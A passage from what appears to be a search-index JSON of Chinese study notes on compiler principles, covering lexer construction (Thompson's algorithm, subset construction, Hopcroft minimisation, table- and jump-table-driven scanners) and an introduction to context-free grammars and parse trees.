<p>\u4e3a\u4e86\u5b9e\u73b0\u8fd9\u4e2a\u8f6c\u6362\u7684\u7a0b\u5e8f\uff0c\u9996\u5148\u9700\u8981\u5b9a\u4e49\u8bb0\u53f7\u7684\u6570\u636e\u7ed3\u6784\uff1a</p> <pre><code>enum kind {IF, LPAREN, ID RPAREN}\nstruct token{\n    enum kind k;\n    char *lexeme;  //\u503c\uff0c\u82e5\u65e0\u5219\u4e3a\u7a7a\n};\n</code></pre>"},{"location":"security/%E4%BA%8C%E8%BF%9B%E5%88%B6%E9%80%86%E5%90%91/%E4%B8%AD%E7%A7%91%E5%A4%A7%E3%80%8A%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E3%80%8B/#_20","title":"\u5b9e\u73b0","text":"<p>\u8bcd\u6cd5\u5206\u6790\u5668 \u81f3\u5c11\u6709\u4e24\u79cd\u5b9e\u73b0\u65b9\u6cd5</p> <ul> <li>\u624b\u5de5\u7f16\u7801\u5b9e\u73b0\uff1a\u76f8\u5bf9\u590d\u6742\uff0c\u4f46\u76ee\u524d\u7684\u4e3b\u6d41\u7684\u5f00\u6e90\u7f16\u8bd1\u5668\u5927\u591a\u91c7\u7528\u624b\u5de5\u7f16\u7801\u3002\u4f8b\u5982 gcc\u3001llvm</li> <li>\u8bcd\u6cd5\u5206\u6790\u5668\u81ea\u52a8\u751f\u6210\u5668\uff1a\u7a0b\u5e8f\u5458\u63d0\u4f9b\u8bcd\u6cd5\u89c4\u5219\u58f0\u660e\uff0c\u5373\u53ef\u5feb\u901f\u81ea\u52a8\u751f\u6210\uff0c\u4f46\u8f83\u96be\u63a7\u5236\u7ec6\u8282\u3002\u81ea\u52a8\u751f\u6210\u5de5\u5177\u6709 lex\u3001flex\u3001jlex \u7b49</li> </ul>"},{"location":"security/%E4%BA%8C%E8%BF%9B%E5%88%B6%E9%80%86%E5%90%91/%E4%B8%AD%E7%A7%91%E5%A4%A7%E3%80%8A%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E3%80%8B/#_21","title":"\u624b\u5de5\u5b9e\u73b0","text":"<p>\u7406\u89e3\u624b\u5de5\u5b9e\u73b0\u7684\u6838\u5fc3\u524d\u63d0\u662f\u7406\u89e3\u8f6c\u6362\u56fe\u3002</p>"},{"location":"security/%E4%BA%8C%E8%BF%9B%E5%88%B6%E9%80%86%E5%90%91/%E4%B8%AD%E7%A7%91%E5%A4%A7%E3%80%8A%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E3%80%8B/#_22","title":"\u81ea\u52a8\u751f\u6210","text":"<p>\u81ea\u52a8\u751f\u6210\u6d89\u53ca\u7684\u6570\u5b66\u7406\u8bba\uff1a</p> <ul> <li>\u6b63\u5219\u8868\u8fbe\u5f0f</li> <li>\u6709\u7a77\u81ea\u52a8\u673a\uff08\u6709\u9650\u72b6\u6001\u81ea\u52a8\u673a\uff0cFA\uff09</li> </ul> <p>\u4e0a\u8ff0\u6570\u5b66\u539f\u7406\u89c1\u524d\u6587\u3002</p> <p>\u81ea\u52a8\u751f\u6210\u5de5\u5177\uff08e.g. lex, flex, jlex\uff09\uff0c\u63a5\u53d7\u58f0\u660e\u5f0f\u89c4\u8303\uff0c\u81ea\u52a8\u751f\u6210 \u8bcd\u6cd5\u5206\u6790\u5668\u3002</p> <p>\u4e00\u822c\u6765\u8bf4\uff0c\u8bcd\u6cd5\u5206\u6790\u5668\u7684\u4ee3\u7801\u91cf\u5728\u51e0\u5343\u884c\uff0c\u800c\u58f0\u660e\u5f0f\u89c4\u8303\u7684\u4ee3\u7801\u91cf\u5f80\u5f80\u53ea\u6709\u51e0\u767e\u884c\u3002</p> <p>\u5728\u81ea\u52a8\u751f\u6210\u4e2d\uff0c\u53ea\u9700\u8981\u63d0\u4f9b\u58f0\u660e\u5f0f\u89c4\u8303\u5373\u53ef\uff0c\u4e0b\u9762\u8bb2\u89e3\u7684\u5185\u5bb9\u662f\uff0c\u81ea\u52a8\u751f\u6210\u5de5\u5177\u662f\u5982\u4f55\u5b9e\u73b0\u7684\uff01</p> <p></p> <p>\u5df2\u77e5\u5728\u81ea\u52a8\u751f\u6210\u8bcd\u6cd5\u5206\u6790\u5668\u7684\u8fc7\u7a0b\u4e2d\uff0c\u9700\u8981\u63d0\u4f9b\u8bcd\u6cd5\u89c4\u5219\u58f0\u660e\uff0c\u8be5\u58f0\u660e\u4f7f\u7528\u6b63\u5219\u8868\u8fbe\u5f0f RE \u6765\u63d0\u4f9b\u3002</p> <p>\u5982\u56fe\u6240\u793a\u662f\u81ea\u52a8\u751f\u6210\u7684\u5404\u4e2a\u6b65\u9aa4\uff0c\u9996\u5148\u9700\u8981\u901a\u8fc7 Thompson \u7b97\u6cd5\u5c06 RE \u8f6c\u6362\u4e3a NFA\uff0c\u7531\u4e8e NFA \u4e0d\u9002\u7528\u76f4\u63a5\u7528\u4e8e\u8bcd\u6cd5\u5206\u6790\u5668\u7684\u8bc6\u522b\uff0c\u56e0\u4e3a\u5b83\u7684\u72b6\u6001\u8f6c\u79fb\u662f\u4e0d\u786e\u5b9a\u7684\uff0c\u56e0\u6b64\u6211\u4eec\u7684\u7b97\u6cd5\u5f80\u5f80\u9700\u8981\u56de\u6eaf\uff0c\u5bf9\u4e8e\u5206\u6790\u7684\u6548\u7387\u4f1a\u8f83\u4f4e\u3002</p> <p>\u56e0\u6b64\u9700\u8981\u4f7f\u7528\u5b50\u96c6\u6784\u9020\u7b97\u6cd5\u5c06 NFA \u8f6c\u6362\u6210 DFA\u3002</p>"},{"location":"security/%E4%BA%8C%E8%BF%9B%E5%88%B6%E9%80%86%E5%90%91/%E4%B8%AD%E7%A7%91%E5%A4%A7%E3%80%8A%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E3%80%8B/#renfathompson","title":"RE\u2192NFA\uff1aThompson \u7b97\u6cd5","text":"<p>\u6b63\u5219\u8868\u8fbe\u5f0f\uff08Regular Expression, RE\uff09\u662f\u4e00\u79cd\u7528\u6765\u63cf\u8ff0 \u6b63\u5219\u8bed\u8a00 \u7684\u66f4\u7d27\u51d1\u7684\u8868\u793a\u65b9\u6cd5\uff0c\u5176\u5b9a\u4e49\u5982\u4e0b\uff1a</p> <ul> <li>\u5bf9\u4e8e\u7ed9\u5b9a\u7684\u5b57\u7b26\u96c6 \u03a3={r1, r2, ..., rn}</li> <li>\u5f52\u7eb3\u5b9a\u4e49\uff1a</li> <li>\u7a7a\u4e32 \u03b5 \u662f\u6b63\u5219\u8868\u8fbe\u5f0f</li> <li>\u5bf9\u4e8e\u4efb\u610f r\u2208\u03a3\uff0cr \u662f\u6b63\u5219\u8868\u8fbe\u5f0f</li> <li>\u5982\u679c M \u548c N \u662f\u6b63\u5219\u8868\u8fbe\u5f0f\uff0c\u5219\u4ee5\u4e0b\u4e5f\u662f\u6b63\u5219\u8868\u8fbe\u5f0f\uff1a<ul> <li>\u9009\u62e9\uff1aM|N = {M, N}</li> <li>\u8fde\u63a5\uff1aMN = {mn | m\u2208M, n\u2208N}</li> <li>\u514b\u6797\u95ed\u5305\uff1aM* = {\u03b5, M, MM, MMM, ...}</li> </ul> </li> </ul> <p>Thompson \u7b97\u6cd5\u57fa\u4e8e\u5bf9 RE \u7684\u7ed3\u6784\u505a\u5f52\u7eb3\uff1a</p> <ul> <li>\u5bf9\u57fa\u672c\u7684 RE \u76f4\u63a5\u6784\u9020\uff1a\u5f52\u7eb3\u5b9a\u4e49\u524d\u4e24\u6761\u662f\u57fa\u672c RE\u3002</li> <li>\u5bf9\u590d\u5408\u7684 RE \u9012\u5f52\u6784\u9020\uff1a\u5f52\u7eb3\u5b9a\u4e49\u7684\u7b2c\u4e09\u6761\u4e0b\u5171\u6709\u4e09\u6761\uff0c\u662f\u590d\u5408 RE\u3002</li> </ul> <p>\u7b97\u6cd5\u8be6\u7ec6\u5185\u5bb9\u89c1\uff1aRE \u8f6c\u6362 NFA</p> <p>\u793a\u4f8b\uff1aa(b|c)*\uff0c\u5176\u57fa\u4e8e Thompson \u751f\u6210\u7684 NFA \u5982\u56fe\u6240\u793a\uff1a</p> <p></p>"},{"location":"security/%E4%BA%8C%E8%BF%9B%E5%88%B6%E9%80%86%E5%90%91/%E4%B8%AD%E7%A7%91%E5%A4%A7%E3%80%8A%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E3%80%8B/#nfadfa","title":"NFA\u2192DFA\uff1a\u5b50\u96c6\u6784\u9020\u7b97\u6cd5","text":"<p>\u7531\u4e8e NFA \u7684\u72b6\u6001\u8f6c\u79fb\u4e0d\u786e\u5b9a\uff0c\u56e0\u6b64\u5f80\u5f80\u9700\u8981\u56de\u6eaf\uff0c\u800c\u5bfc\u81f4\u8bcd\u6cd5\u5206\u6790\u6548\u7387\u4f4e\uff0c\u56e0\u6b64\u9700\u8981\u5c06 NFA \u8f6c\u5316\u4e3a\u7b49\u4ef7\u7684 DFA\uff0c\u540c\u6837\u4ee5 a(b|c)*\u4e3a\u4f8b\uff0c\u5176\u6839\u636e\u5b50\u96c6\u6784\u9020\u7b97\u6cd5\u751f\u6210\u7684 DFA \u5982\u56fe\u6240\u793a\uff1a</p> <p></p>"},{"location":"security/%E4%BA%8C%E8%BF%9B%E5%88%B6%E9%80%86%E5%90%91/%E4%B8%AD%E7%A7%91%E5%A4%A7%E3%80%8A%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E3%80%8B/#dfa-hopcroft","title":"DFA\u2192 \u8bcd\u6cd5\u5206\u6790\u5668\uff1aHopcroft \u6700\u5c0f\u5316\u7b97\u6cd5","text":"<p>\u901a\u8fc7\u5b50\u96c6\u6784\u9020\u7b97\u6cd5\u6784\u5efa\u7684 DFA \u4e0d\u662f\u6700\u7b80\u5355\u7684 DFA\uff0c\u6709\u8fdb\u4e00\u6b65\u4f18\u5316\u7684\u7a7a\u95f4\uff0c\u540c\u6837\u4ee5 a(b|c)*\u4e3a\u4f8b\uff0c\u5c06\u4e0a\u8ff0\u751f\u6210\u7684 DFA \u4f18\u5316\u540e\u7684\u7ed3\u679c\u5982\u56fe\u6240\u793a\uff1a</p> <p></p>"},{"location":"security/%E4%BA%8C%E8%BF%9B%E5%88%B6%E9%80%86%E5%90%91/%E4%B8%AD%E7%A7%91%E5%A4%A7%E3%80%8A%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E3%80%8B/#_23","title":"\u4ee3\u7801\u5b9e\u73b0\u8bcd\u6cd5\u5206\u6790\u5668","text":"<p>\u751f\u6210\u4e86\u6700\u7ec8\u7684 DFA \u4e4b\u540e\uff0c\u6839\u636e\u5176\u6784\u5efa\u4e00\u4e2a\u8f6c\u79fb\u8868\uff0c\u5982\u56fe\u6240\u793a\uff1a</p> <p></p> <p>\u7136\u540e\u4f7f\u7528\u4ee3\u7801\u5b9e\u73b0\u8bcd\u6cd5\u5206\u6790\u5668\uff0c\u5171\u6709\u51e0\u79cd\u65b9\u6cd5\uff1a</p> <ul> <li>\u8f6c\u79fb\u8868</li> <li>\u54c8\u5e0c\u8868</li> <li>\u8df3\u8f6c\u8868</li> </ul>"},{"location":"security/%E4%BA%8C%E8%BF%9B%E5%88%B6%E9%80%86%E5%90%91/%E4%B8%AD%E7%A7%91%E5%A4%A7%E3%80%8A%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E3%80%8B/#_24","title":"\u8f6c\u79fb\u8868","text":"<p>\u9996\u5148\u8981\u7528\u4ee3\u7801\u5b9e\u73b0\u56fe\u4e2d\u7684\u8f6c\u79fb\u8868\uff0c\u4ee3\u7801\u5982\u4e0b\uff1a</p> <pre><code>char table[M][N];\n\ntable[0]['a'] = 1;\ntable[1]['b'] = 1;\ntable[1]['c'] = 1;\n//other table entries are ERROR,\u53ef\u4ee5\u7406\u89e3ERROR = -1\n</code></pre> <p>\u7136\u540e\u5b9e\u73b0\u8bcd\u6cd5\u5206\u6790\u9a71\u52a8\u4ee3\u7801\uff0c\u7528\u4e8e\u8bc6\u522b\u4e00\u4e2a token\uff0c\u5373\u8bb0\u53f7\u3002</p> <pre><code>nextToken()\n    state = 0\n    stack = []\n    while(state != ERROR) // \u5728\u4e0a\u9762\u7684\u8868\u683c\u4e2d\u8868\u793a\u4e3a\u7a7a\uff0c\u5219\u5faa\u73af\u7ed3\u675f\n        c = getChar()\n        if(state is ACCEPT)  // \u63a5\u53d7\u72b6\u6001,q1\uff1b \u8868\u683c\u4e2d\u8868\u793a\u4e3a\u72b6\u60011\uff0c\u6709\uff081,b\uff09, (1,c)\n            clear(stack)\n        push(state)  // \u628astate\u538b\u5165stack\u6808\u5e95\n        state = table[state][c]\n    // \u6b64\u65f6\u5df2\u7ecf\u6210\u529f\u8bc6\u522b\u4e86\u7b2c\u4e00\u4e2atoken\uff0c\u4f46\u591a\u8bfb\u5165\u4e86\u4e00\u4e2a\uff0c\u56e0\u6b64\u9700\u8981pop\u51fa\u6765\uff0c\u5e76\u4e14\u56de\u6eda\n    while(state is not ACCEPT)\n        state = pop()\n        rollback()\n</code></pre> <p>\u4f8b\u5982\u8f93\u5165\"abcabc\"\uff0c\u5f53\u4f9d\u6b21\u8bfb\u5165 a, b, c \u4e4b\u540e\uff0c\u6808\u4e2d\u90fd\u662f\u7a7a\u7684\uff0c\u7136\u540e\u8bfb\u5165 a\uff0c\u6b64\u65f6 state \u4e3a ERROR\uff0c\u56e0\u6b64\u9700\u8981\u51fa\u6808\uff0c\u5e76\u4e14\u5b57\u7b26\u6307\u9488\u56de\u6eda\u3002\u7136\u540e nextToken()\u65b9\u6cd5\u7684\u6267\u884c\u5230\u6b64\u7ed3\u675f\uff0c\u8bc6\u522b\u4e86\u7b2c\u4e00\u4e2a token\u2014\u2014\"abc\"\u3002</p> <p>\u6b64\u5904\u7684 stack \u6808\u6570\u636e\u7ed3\u6784\u662f\u4e3a\u4e86\u5b9e\u73b0 \u6700\u957f\u5339\u914d\u3002</p>"},{"location":"security/%E4%BA%8C%E8%BF%9B%E5%88%B6%E9%80%86%E5%90%91/%E4%B8%AD%E7%A7%91%E5%A4%A7%E3%80%8A%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E3%80%8B/#_25","title":"\u8df3\u8f6c\u8868","text":"<p>\u4f7f\u7528\u8df3\u8f6c\u8868\u7684\u65b9\u5f0f\uff0c\u4ee3\u7801\u4e0a\u66f4\u4e3a\u76f4\u89c2\uff0c\u4e14\u7531\u4e8e\u6307\u5b9a\u4e86\u8f6c\u6362\u7684\u5b57\u7b26\uff0c\u56e0\u6b64\u53ef\u4ee5\u63d0\u9ad8\u8f6c\u6362\u7684\u6548\u7387\u3002\u4e14\u65e0\u9700\u5728\u5185\u5b58\u4e2d\u7ef4\u62a4\u4e00\u4e2a\u8f6c\u6362\u8868\uff0c\u5f80\u5f80\u5b9e\u9645\u4e2d\u8f6c\u6362\u8868\u8fd8\u662f\u6bd4\u8f83\u5927\u7684\u3002</p> <p>\u56e0\u6b64\u5f88\u591a\u5b9e\u9645\u7684\u5f00\u53d1\u5de5\u5177\uff0c\u4f8b\u5982 flex \u90fd\u662f\u91c7\u7528\u8df3\u8f6c\u8868\u8fd9\u79cd\u65b9\u5f0f\u3002</p> <pre><code>nextToken()\n    state = 0\n    stack = []\n    goto q0\nq0:\n    c = getChar()\n    if(state is ACCEPT)\n        clear(stack)\n    push(state)\n    if(c == 'a')\n        goto q1\nq1:\n    c = getChar()\n    if(state is ACCEPT)\n        clear(stack)\n    push(state)\n    if(c == 'b' || c == 'c')\n        goto q1\n</code></pre>"},{"location":"security/%E4%BA%8C%E8%BF%9B%E5%88%B6%E9%80%86%E5%90%91/%E4%B8%AD%E7%A7%91%E5%A4%A7%E3%80%8A%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E3%80%8B/#_26","title":"\u8bed\u6cd5\u5206\u6790","text":""},{"location":"security/%E4%BA%8C%E8%BF%9B%E5%88%B6%E9%80%86%E5%90%91/%E4%B8%AD%E7%A7%91%E5%A4%A7%E3%80%8A%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E3%80%8B/#_27","title":"\u4efb\u52a1","text":"<p>\u8bed\u6cd5\u5206\u6790\u5668\u63a5\u6536\u8bcd\u6cd5\u5206\u6790\u5668\u8f93\u51fa\u7684\u8bb0\u53f7\u6d41\uff0c\u751f\u6210\u8bed\u6cd5\u6811\u3002</p> <p></p> <p>\u6b64\u5916\uff0c\u5bf9\u4e8e\u8bed\u6cd5\u5206\u6790\u9636\u6bb5\u8fd8\u57fa\u4e8e\u8bed\u8a00\u7684\u8bed\u6cd5\u89c4\u5219\uff0c\u68c0\u6d4b\u8bed\u6cd5\u9519\u8bef\uff0c\u53ea\u6709\u6b63\u786e\u7684\u8bed\u6cd5\u624d\u80fd\u751f\u6210\u5bf9\u5e94\u7684\u8bed\u6cd5\u6811\u3002</p> <p></p> <p>\u5f53\u7a0b\u5e8f\u5458\u5c06\u9519\u8bef\u4fee\u6539\u4e4b\u540e\uff0c\u751f\u6210\u5bf9\u5e94\u7684\u8bed\u6cd5\u6811\u3002</p> <p></p>"},{"location":"security/%E4%BA%8C%E8%BF%9B%E5%88%B6%E9%80%86%E5%90%91/%E4%B8%AD%E7%A7%91%E5%A4%A7%E3%80%8A%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E3%80%8B/#_28","title":"\u5b66\u4e60\u8def\u5f84","text":"<ul> <li>\u6570\u5b66\u7406\u8bba\uff1a\u4e0a\u4e0b\u6587\u65e0\u5173\u6587\u6cd5\uff08context-free grammar\uff0cCFG\uff09\uff0c\u662f\u7528\u4e8e\u63cf\u8ff0\u8bed\u8a00\u8bed\u6cd5\u89c4\u5219\u7684\u6570\u5b66\u5de5\u5177\u3002</li> <li>\u81ea\u9876\u5411\u4e0b\u5206\u6790</li> <li>\u9012\u5f52\u4e0b\u964d\u5206\u6790\u7b97\u6cd5\uff08\u9884\u6d4b\u5206\u6790\u7b97\u6cd5\uff09</li> <li>LL \u5206\u6790\u7b97\u6cd5</li> <li>\u81ea\u5e95\u5411\u4e0a\u5206\u6790</li> <li>LR \u5206\u6790\u7b97\u6cd5</li> </ul>"},{"location":"security/%E4%BA%8C%E8%BF%9B%E5%88%B6%E9%80%86%E5%90%91/%E4%B8%AD%E7%A7%91%E5%A4%A7%E3%80%8A%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E3%80%8B/#_29","title":"\u6587\u6cd5","text":"<p>\u6587\u6cd5\u5171\u6709\u56db\u7c7b\uff1a</p> <p></p> <p>\u4ea7\u751f\u5f0f\u96c6\u5408\uff1a\u03b1\u2192\u03b2</p> <ul> <li>0 \u578b\u6587\u6cd5\uff1a\u4ec5\u8981\u6c42 \u03b1 \u4e2d\u81f3\u5c11\u5305\u542b\u4e00\u4e2a\u975e\u7ec8\u7ed3\u7b26</li> <li>1 \u578b\u6587\u6cd5\uff0c\u4e0a\u4e0b\u6587\u6709\u5173\u6587\u6cd5(CSG)\uff1a|\u03b1|\u2264|\u03b2|</li> <li>2 \u578b\u6587\u6cd5\uff0c\u4e0a\u4e0b\u6587\u65e0\u5173\u6587\u6cd5(CFG)\uff1a\u03b1\u2208V<sub>N</sub>\uff0c\u5373 \u03b1 \u53ea\u80fd\u662f\u4e00\u4e2a\u975e\u7ec8\u7ed3\u7b26\uff0c\u4e00\u822c\u5f62\u5f0f\u4e3a A\u2192\u03b2\u3002\u53ef\u4ee5\u63cf\u8ff0\u5927\u90e8\u5206\u7a0b\u5e8f\u8bbe\u8ba1\u8bed\u8a00\u7684\u8bed\u6cd5\u6784\u9020\u3002</li> <li>3 \u578b\u6587\u6cd5\uff0c\u6b63\u5219\u6587\u6cd5(RG)\uff0c\u5206\u4e3a\u4e24\u7c7b\uff1a</li> <li>\u53f3\u7ebf\u6027\u6587\u6cd5\uff1aA\u2192wB \u6216 A\u2192w\uff0c\u8868\u8fbe\u5f0f\u7684\u53f3\u90e8\u53ea\u80fd\u662f\u7ec8\u7ed3\u7b26 w\uff0c\u8981\u4e48\u662f wB</li> <li>\u5de6\u7ebf\u578b\u6587\u6cd5\uff1aA\u2192Bw \u6216 A\u2192w</li> </ul> <p>\u56db\u79cd\u8bed\u6cd5\u4e4b\u95f4\u662f\u9010\u7ea7\u9650\u5236\u548c\u9010\u7ea7\u5305\u542b\u7684\u5173\u7cfb\u3002\u5373\uff0c\u5982\u679c\u4e00\u4e2a\u6587\u6cd5\u662f 3 \u578b\u6587\u6cd5\uff0c\u90a3\u4ed6\u4e00\u5b9a\u662f 2 \u578b\u6587\u6cd5\uff0c\u4e5f\u4e00\u5b9a\u662f 1 \u578b\u6587\u6cd5\uff0c\u4e5f\u4e00\u5b9a\u662f 0 \u578b\u6587\u6cd5\u3002</p> <p>\u5176\u4e2d 3 \u578b\u6587\u6cd5\uff0c\u4e5f\u5c31\u662f\u6b63\u5219\u6587\u6cd5\uff0c\u88ab\u5e94\u7528\u4e8e\u8bcd\u6cd5\u5206\u6790\u4e2d\uff0c2 \u578b\u6587\u6cd5\uff0c\u5373\u4e0a\u4e0b\u6587\u65e0\u5173\u6587\u6cd5\u88ab\u5e94\u7528\u4e8e\u8bed\u6cd5\u5206\u6790\u4e2d\u3002\u800c 0 \u578b\u548c 1 \u578b\u6587\u6cd5\u76ee\u524d\u6ca1\u6709\u5e7f\u6cdb\u7684\u5e94\u7528\u573a\u666f\u3002</p> <p>Add 20231108\uff0c\u53c2\u8003 https://www.bilibili.com/video/BV1gL411j7vS/ 0:22:57</p> <p>\u4e0a\u4e0b\u6587\u6709\u5173\u6587\u6cd5\u5176\u53f3\u4fa7\u53ef\u4ee5\u662f\u975e\u7ec8\u7ed3\u7b26\uff0c\u4f8b\u5982\uff1a</p> <ul> <li>aE \u2192 aEb</li> </ul> <p>\u6b64\u65f6\u5fc5\u987b\u51fa\u73b0 aE \u624d\u80fd\u66ff\u6362\uff0c\u5373\u5fc5\u987b\u540c\u65f6\u51fa\u73b0\u7ec8\u7ed3\u7b26 a \u548c\u975e\u7ec8\u7ed3\u7b26 E \u624d\u80fd\u66ff\u6362\uff0c\u56e0\u6b64\u662f\u4e0a\u4e0b\u6587\u6709\u5173\uff08\u654f\u611f\uff09\u7684\u3002</p> <p>\u800c\u5bf9\u4e8e\u4e0a\u4e0b\u6587\u65e0\u5173\u6587\u6cd5\uff0c\u4f8b\u5982\uff1aE \u2192 aEb\uff0c\u53ea\u8981\u51fa\u73b0\u4e86\u975e\u7ec8\u7ed3\u7b26 E \u5c31\u53ef\u4ee5\u66ff\u6362\uff0c\u56e0\u6b64\u662f\u4e0a\u4e0b\u6587\u65e0\u5173\u7684\u3002</p>"},{"location":"security/%E4%BA%8C%E8%BF%9B%E5%88%B6%E9%80%86%E5%90%91/%E4%B8%AD%E7%A7%91%E5%A4%A7%E3%80%8A%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E3%80%8B/#2","title":"2 \u578b\u6587\u6cd5\u2014\u4e0a\u4e0b\u6587\u65e0\u5173\u6587\u6cd5","text":"<p>\u4e0a\u4e0b\u6587\u65e0\u5173\u6587\u6cd5 CFG\uff0c\u5176\u5b9a\u4e49\u4e3a\u56db\u5143\u7ec4\uff1aG=(V<sub>T</sub>, V<sub>N</sub>, P, S)</p> <ul> <li>V<sub>T</sub>\uff1a\u7ec8\u7ed3\u7b26\uff08terminal symbol\uff09\u96c6\u5408\uff0c\u662f\u6587\u6cd5\u5b9a\u4e49\u7684\u8bed\u8a00\u7684\u57fa\u672c\u7b26\u53f7\uff0c\u6709\u65f6\u4e5f\u79f0\u4e3a token</li> <li>V<sub>N</sub>\uff1a\u975e\u7ec8\u7ed3\u7b26\uff08nonterminal\uff09\u96c6\u5408\uff0c\u662f\u7528\u6765\u8868\u793a \u8bed\u6cd5\u6210\u5206 \u7684\u7b26\u53f7\uff0c\u6709\u65f6\u4e5f\u79f0\u4e3a\u8bed\u6cd5\u53d8\u91cf\uff0c\u901a\u5e38\u7528&lt;&gt;\u5305\u88f9\u3002</li> </ul> <p>\u6ce8\u610f\uff1aV<sub>T</sub>\u2229V<sub>N</sub>=\u2205\uff0c\uff1aV<sub>T</sub>\u222aV<sub>N</sub>\u8868\u793a \u6587\u6cd5\u7b26\u53f7 \u96c6\uff0c\u662f\u4e00\u4e2a\u5b57\u6bcd\u8868\u3002</p> <ul> <li>P\uff1a\u4ea7\u751f\u5f0f\u96c6\u5408\uff0c\u63cf\u8ff0\u4e86\u5c06\u7ec8\u7ed3\u7b26\u548c\u975e\u7ec8\u7ed3\u7b26\u7ec4\u5408\u6210\u4e32\u7684\u65b9\u6cd5</li> <li>\u03b1\u2208V<sub>N</sub>\uff0c\u5373 \u03b1 \u53ea\u80fd\u662f V<sub>N</sub>\u4e2d\u7684\u4e00\u4e2a\u5143\u7d20\uff0c\u56e0\u6b64\u4e0a\u4e0b\u6587\u65e0\u5173\u6587\u6cd5\u7684\u4ea7\u751f\u5f0f\u7684\u4e00\u822c\u5f62\u5f0f\u4e3a A\u2192\u03b2</li> <li>\u03b2\u2208(V<sub>T</sub>\u222aV<sub>N</sub>)<sup>*</sup>\uff0c\u79f0\u4e3a\u4ea7\u751f\u5f0f\u7684\u4f53\uff08body\uff09\u6216\u53f3\u90e8\uff08rightside\uff09</li> <li>\u4ea7\u751f\u5f0f\u7684\u7b80\u5199\uff1a\u03b1\u2192\u03b2<sub>1</sub> , \u03b1\u2192\u03b2<sub>2</sub> \u53ef\u4ee5\u7b80\u5199\u4e3a \u03b1\u2192\u03b2<sub>1</sub>|\u03b2<sub>2</sub>\uff0c\u5176\u4e2d \u03b2<sub>n</sub>\u79f0\u4e3a\u5019\u9009\u5f0f\uff0c|\u8bfb\u4f5c\u6216\u3002</li> <li>S\uff1a\u5f00\u59cb\u7b26\u53f7\uff0cS\u2208V<sub>N</sub>\uff0c\u8868\u793a\u8be5\u6587\u6cd5\u4e2d\u6700\u5927\u7684 \u8bed\u6cd5\u6210\u5206\u3002</li> </ul> <p>\u6ce8\u610f\uff1a\u5728\u4e0d\u5f15\u8d77\u6b67\u4e49\u7684\u60c5\u51b5\u4e0b\u554a\uff0c\u53ef\u4ee5\u4ec5\u7528 \u4ea7\u751f\u5f0f\u96c6\u5408 P \u8868\u793a\u6587\u6cd5\uff0c\u800c\u7701\u7565 V<sub>T</sub>, V<sub>N</sub>, S\u3002</p>"},{"location":"security/%E4%BA%8C%E8%BF%9B%E5%88%B6%E9%80%86%E5%90%91/%E4%B8%AD%E7%A7%91%E5%A4%A7%E3%80%8A%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E3%80%8B/#_30","title":"\u63a8\u5bfc\u548c\u5206\u6790\u6811","text":""},{"location":"security/%E4%BA%8C%E8%BF%9B%E5%88%B6%E9%80%86%E5%90%91/%E4%B8%AD%E7%A7%91%E5%A4%A7%E3%80%8A%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E3%80%8B/#_31","title":"\u63a8\u5bfc\u548c\u89c4\u7ea6","text":"<p>\u7ed9\u5b9a\u6587\u6cd5 G\uff0c\u4ece G \u7684\u5f00\u59cb\u7b26\u53f7 S \u5f00\u59cb\uff0c\u7528\u4ea7\u751f\u5f0f\u5b50\u7684\u53f3\u90e8\u66ff\u6362\u5de6\u90e8\u7684\u975e\u7ec8\u7ed3\u7b26\u3002</p> <p>\u6b64\u8fc7\u7a0b\u4e0d\u65ad\u91cd\u590d\uff0c\u76f4\u5230\u4e0d\u51fa\u73b0\u975e\u7ec8\u7ed3\u7b26\u4e3a\u6b62\u3002</p> <p>\u6700\u7ec8\u63a8\u5bfc\u5f97\u5230\u7684\u4e32\u79f0\u4e3a\u53e5\u5b50\u3002</p> <p>\u63a8\u5bfc\u6709\u4e24\u79cd\u7279\u6b8a\u7684\u65b9\u5f0f\uff1a</p> <ul> <li>\u6700\u5de6\u63a8\u5bfc\uff1a\u6bcf\u6b21\u603b\u662f\u9009\u62e9\u6700\u5de6\u4fa7\u7684\u7b26\u53f7\u8fdb\u884c\u66ff\u6362</li> <li>\u6700\u53f3\u63a8\u5bfc\uff1a\u6bcf\u6b21\u603b\u662f\u9009\u62e9\u6700\u53f3\u4fa7\u7684\u7b26\u53f7\u8fdb\u884c\u66ff\u6362</li> </ul> <p>\u4e0e\u4e4b\u76f8\u53cd\u7684\u8fc7\u7a0b\u79f0\u4e3a\u89c4\u7ea6\u3002</p>"},{"location":"security/%E4%BA%8C%E8%BF%9B%E5%88%B6%E9%80%86%E5%90%91/%E4%B8%AD%E7%A7%91%E5%A4%A7%E3%80%8A%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E3%80%8B/#_32","title":"\u5206\u6790\u6811\u548c\u4e8c\u4e49\u6027","text":"<p>\u63a8\u5bfc\u53ef\u4ee5\u8868\u8fbe\u6210\u6811\u72b6\u7ed3\u6784\uff0c\u6811\u7684\u7279\u70b9\u5982\u4e0b\uff1a</p> <ul> <li>\u6811\u4e2d\u7684\u6bcf\u4e2a\u5185\u90e8\u8282\u70b9\u4ee3\u8868\u975e\u7ec8\u7ed3\u7b26</li> <li>\u6bcf\u4e2a\u53f6\u5b50\u8282\u70b9\u4ee3\u8868\u7ec8\u7ed3\u7b26</li> <li>\u6bcf\u4e00\u6b65\u63a8\u5bfc\u4ee3\u8868\u5982\u4f55\u4ece\u53cc\u4eb2\u7ed3\u70b9\u751f\u6210\u5b83\u7684\u76f4\u63a5\u5b69\u5b50\u8282\u70b9</li> </ul> 